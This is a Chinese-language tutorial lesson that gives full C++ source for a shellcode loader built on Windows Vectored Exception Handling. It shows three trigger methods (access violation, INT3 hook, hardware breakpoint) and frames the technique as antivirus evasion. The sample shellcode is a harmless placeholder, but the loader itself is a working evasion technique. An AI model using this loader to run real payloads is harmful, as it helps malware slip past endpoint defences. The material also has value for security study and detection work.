# 课时11 - C++ VEH实现ShellCode Loader

## 课程目标
1. 理解VEH（向量异常处理）机制
2. 掌握AddVectoredExceptionHandler的使用
3. 实现VEH方式执行ShellCode
4. 了解异常处理在免杀中的应用

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| VEH | Vectored Exception Handling | 向量异常处理 |
| SEH | Structured Exception Handling | 结构化异常处理 |
| EXCEPTION_CONTINUE_EXECUTION | - | 继续执行，从异常点重试 |
| Hardware Breakpoint | 硬件断点 | 使用调试寄存器的断点 |

## 代码实现

```cpp
// veh_loader.cpp
// VEH方式执行ShellCode

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

LPVOID g_ShellcodeAddr = NULL;

// VEH处理函数
LONG CALLBACK VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    // 检查是否是我们触发的异常
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION ||
        ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        
        printf("[VEH] Exception caught: 0x%08X\n", 
               ExceptionInfo->ExceptionRecord->ExceptionCode);
        
        if (g_ShellcodeAddr) {
            // 修改指令指针到ShellCode
            #ifdef _WIN64
            printf("[VEH] Redirecting RIP to shellcode: %p\n", g_ShellcodeAddr);
            ExceptionInfo->ContextRecord->Rip = (DWORD64)g_ShellcodeAddr;
            #else
            printf("[VEH] Redirecting EIP to shellcode: %p\n", g_ShellcodeAddr);
            ExceptionInfo->ContextRecord->Eip = (DWORD)g_ShellcodeAddr;
            #endif
            
            g_ShellcodeAddr = NULL;  // 防止循环
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

// 方法1: 通过异常跳转执行
void Method1_ExceptionRedirect() {
    printf("[*] Method 1: Exception Redirect\n");
    
    // 分配可执行内存
    g_ShellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!g_ShellcodeAddr) return;
    
    memcpy(g_ShellcodeAddr, shellcode, sizeof(shellcode));
    
    // 注册VEH处理器
    PVOID handler = AddVectoredExceptionHandler(1, VehHandler);
    if (!handler) {
        VirtualFree(g_ShellcodeAddr, 0, MEM_RELEASE);
        return;
    }
    
    printf("[+] VEH handler registered\n");
    
    // 触发异常
    printf("[*] Triggering exception...\n");
    __try {
        // 访问空指针触发异常
        *(int*)NULL = 0;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // 不应该执行到这里，VEH会处理
    }
    
    printf("[+] Returned from shellcode\n");
    
    RemoveVectoredExceptionHandler(handler);
    VirtualFree(g_ShellcodeAddr, 0, MEM_RELEASE);
}

// 方法2: 使用INT3断点
LPVOID g_OriginalCode = NULL;
BYTE g_OriginalByte = 0;

LONG CALLBACK Int3Handler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        LPVOID addr = ExceptionInfo->ExceptionRecord->ExceptionAddress;
        
        if (addr == g_OriginalCode) {
            printf("[VEH] INT3 hit at %p\n", addr);
            
            // 恢复原始字节
            DWORD oldProtect;
            VirtualProtect(g_OriginalCode, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *(BYTE*)g_OriginalCode = g_OriginalByte;
            VirtualProtect(g_OriginalCode, 1, oldProtect, &oldProtect);
            
            // 执行ShellCode
            if (g_ShellcodeAddr) {
                typedef int (*SC_FUNC)();
                SC_FUNC func = (SC_FUNC)g_ShellcodeAddr;
                func();
            }
            
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

void DummyFunction() {
    printf("[*] DummyFunction called\n");
}

void Method2_Int3Hook() {
    printf("[*] Method 2: INT3 Hook\n");
    
    g_ShellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!g_ShellcodeAddr) return;
    
    memcpy(g_ShellcodeAddr, shellcode, sizeof(shellcode));
    
    // 注册处理器
    PVOID handler = AddVectoredExceptionHandler(1, Int3Handler);
    
    // Hook目标函数
    g_OriginalCode = (LPVOID)DummyFunction;
    
    DWORD oldProtect;
    VirtualProtect(g_OriginalCode, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    g_OriginalByte = *(BYTE*)g_OriginalCode;
    *(BYTE*)g_OriginalCode = 0xCC;  // INT3
    VirtualProtect(g_OriginalCode, 1, oldProtect, &oldProtect);
    
    printf("[+] INT3 hook installed\n");
    
    // 调用被Hook的函数
    DummyFunction();
    
    printf("[+] Completed\n");
    
    RemoveVectoredExceptionHandler(handler);
    VirtualFree(g_ShellcodeAddr, 0, MEM_RELEASE);
}

// 方法3: 使用硬件断点
LONG CALLBACK HwbpHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 硬件断点触发
        printf("[VEH] Hardware breakpoint hit\n");
        
        // 清除DR0
        ExceptionInfo->ContextRecord->Dr0 = 0;
        ExceptionInfo->ContextRecord->Dr7 &= ~1;
        
        // 执行ShellCode
        if (g_ShellcodeAddr) {
            #ifdef _WIN64
            ExceptionInfo->ContextRecord->Rip = (DWORD64)g_ShellcodeAddr;
            #else
            ExceptionInfo->ContextRecord->Eip = (DWORD)g_ShellcodeAddr;
            #endif
        }
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

void Method3_HardwareBreakpoint() {
    printf("[*] Method 3: Hardware Breakpoint\n");
    
    g_ShellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!g_ShellcodeAddr) return;
    
    memcpy(g_ShellcodeAddr, shellcode, sizeof(shellcode));
    
    PVOID handler = AddVectoredExceptionHandler(1, HwbpHandler);
    
    // 设置硬件断点
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);
    
    // DR0 = 断点地址
    ctx.Dr0 = (DWORD_PTR)DummyFunction;
    // DR7: 启用DR0，执行断点
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 1;
    
    SetThreadContext(hThread, &ctx);
    
    printf("[+] Hardware breakpoint set at %p\n", DummyFunction);
    
    // 触发断点
    DummyFunction();
    
    printf("[+] Completed\n");
    
    RemoveVectoredExceptionHandler(handler);
}

int main() {
    printf("========================================\n");
    printf("     VEH ShellCode Loader              \n");
    printf("========================================\n\n");
    
    Method1_ExceptionRedirect();
    printf("\n");
    
    Method2_Int3Hook();
    printf("\n");
    
    Method3_HardwareBreakpoint();
    
    return 0;
}
```

## 课后作业

### 作业1：实现Guard Page触发
使用PAGE_GUARD触发异常来执行ShellCode。

### 作业2：多层VEH
注册多个VEH处理器，实现链式处理。
